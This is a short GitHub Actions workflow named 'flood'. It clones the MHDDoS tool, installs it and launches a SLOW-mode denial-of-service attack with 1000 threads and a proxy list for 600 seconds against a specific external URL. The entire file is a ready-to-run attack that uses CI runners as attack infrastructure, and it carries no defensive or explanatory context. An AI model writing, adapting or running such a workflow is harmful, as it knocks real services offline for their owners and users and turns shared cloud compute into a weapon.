name: flood
on: workflow_dispatch
jobs:
  flood:
    runs-on: ubuntu-24.04-arm
    steps:
      - name: Flood
        run: |
          git clone https://github.com/MatrixTM/MHDDoS.git
          cd MHDDoS
          pip install -r requirements.txt
          python start.py SLOW https://lscf.eu.cc/api/update 0 1000 all.txt 1000 600 true
